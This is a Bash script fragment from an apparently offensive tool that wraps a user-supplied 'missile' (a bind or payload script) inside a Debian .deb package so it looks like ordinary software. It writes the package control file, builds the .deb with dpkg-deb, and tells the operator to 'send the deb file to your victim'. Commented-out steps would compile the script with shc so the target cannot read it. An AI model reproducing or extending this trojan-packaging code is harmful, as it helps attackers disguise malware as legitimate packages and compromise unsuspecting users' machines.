
# Create a Debpackage
control(){
    while read line
    do
	$line
    done << EOF > ${CUT_SHIT}$vnum$vnumber/DEBIAN/control
echo Package: ${CUT_SHIT}
echo Maintainer: <${email}>
echo Version: $vnumber
echo Architecture: all
echo Description: $description
EOF
}

control2(){
    while read line
    do
	$line
    done << EOF > ${mName}$vnum$vnumber/DEBIAN/control
echo Package: ${mName}
echo Maintainer: <${email}>
echo Version: $vnumber
echo Architecture: all
echo Description: $description
EOF
}

createMalDeb() {
    while printf "${open}${light}${green}Should i associate the missile with a %s package?[y|n]: ${close}" \
		 "${pPackage}"; \
	  read $opt -e inmissile
    do
	case $inmissile in
	    y|Y)	dirfile="${0##*/}${SPID}"
			echo ""
			printf "${open}${light}${yellow}[!]Creating Directories and files, Please wait...${close}\n\n"
			mkdir "$dirfile"
			cd "$_" #### CD INTO THE LAST DIRECTORY "dirfile"
			mkdir -p usr/local/bin && mkdir DEBIAN
			cd usr/local/bin
			sleep 3
			
			chk_file
			
			packagedetails
			cd ../../../../
			
			if echo "$bindscript" | grep -oqE ".sh|.py|.pl";then
			    CUT_SHIT=${CUT_IT%%.*}
			    mv "${dirfile}" "${CUT_SHIT}$vnum$vnumber"
			    cd "$(pwd)/${CUT_SHIT}$vnum$vnumber/usr/local/bin/"
			    #mv ./* "${CUT_SHIT}"
			    cd ../../../../
			    control
			    dpkg-deb --build "${CUT_SHIT}$vnum$vnumber" &>/dev/null &
			    stat=$?
			    wait %1
			    if [[ $stat = 0 ]];then
				rm -rf "${CUT_SHIT}$vnum$vnumber"
			    else
				echo "${open}${light}${red}Fatal Error${close}"
				rm -rf "${CUT_SHIT}$vnum$vnumber"
				exit 1
			    fi
			else
			    
			    printf "${open}${light}${yellow}Enter the name for your missile: ${close}" ; read mName
			    mv "${dirfile}" "${mName}$vnum$vnumber"
			    mv "${mName}$vnum$vnumber/usr/local/bin/"* "${mName}$vnum$vnumber/usr/local/bin/${mName}"
			    cd "${mName}$vnum$vnumber/usr/local/bin"
			    if ls | grep -q ".sh$";then
				CUT_IT=${mName%.*}
				mv "${mName}" "${CUT_IT}"
				#which shc >>/dev/null 2>&1
				#test $? != 0 && \
				#echo -e "shc is not Installed on your computer:P\nThe target might see the content of the missile :P\nI \
				#will continue setting up the missile without shc" && break
				#shc -f ${CUT_IT} && mv ${CUT_IT}.x.c ${CUT_IT}.c
				#gcc ${CUT_IT}.c -o ${CUT_IT} && rm ${CUT_IT}.c && rm ${CUT_IT}.x
			    else
				
				:
				
			    fi
			    
			    cd ../../../../
			    
			    control2
			    dpkg-deb --build "${mName}$vnum$vnumber"
			    if [ $? = 0 ];then
				rm -rf "${CUT_SHIT}$vnum$vnumber"
			    else
				echo "${open}${light}${red}Fatal Error${close}"
				exit 1
			    fi
			    rm -rf "${mName}$vnum$vnumber"
			    
			fi
			
			if [ $? = 0 ];then
			    printf "${open}${light}${green}Ok we are done here..${close}\n"
			    printf "${open}${light}${green}You can now send the deb file to your victim ${close}\n"
			    sleep 3
			    echo ""
			    box3d
			    break
			    exit
			    
			else
			    
			    printf "${open}${light}${red}Error encountered while building debian package${close}\n"
			    
			fi
			
			;;
	    
	    
	    *)
		echo "${open}${light}${red}Invalid Response${close}" && continue ;;
	esac
    done   
}
